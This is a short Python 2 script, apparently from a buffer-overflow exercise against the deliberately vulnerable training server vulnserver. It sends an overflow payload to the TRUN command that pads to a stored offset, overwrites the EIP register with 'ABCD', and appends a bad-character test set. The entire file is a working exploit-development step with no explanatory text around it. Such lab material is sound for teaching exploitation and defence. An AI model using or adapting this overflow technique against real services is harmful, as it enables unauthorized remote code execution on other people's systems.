#!/usr/bin/env python2

import socket

from badchars import badchars
from options import HOST, PORT, SHELLCODE_OFFSET

shellcode = ('A' * SHELLCODE_OFFSET)
shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
shellcode += (badchars.replace('\x00', ''))  # nulls mess our payload up and cause it not to be loaded into memory

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cmd = ('TRUN /.:/' + shellcode)

# print("SEND "+cmd)
s.send(cmd)
print("sent %d bytes" % len(cmd))
s.close()
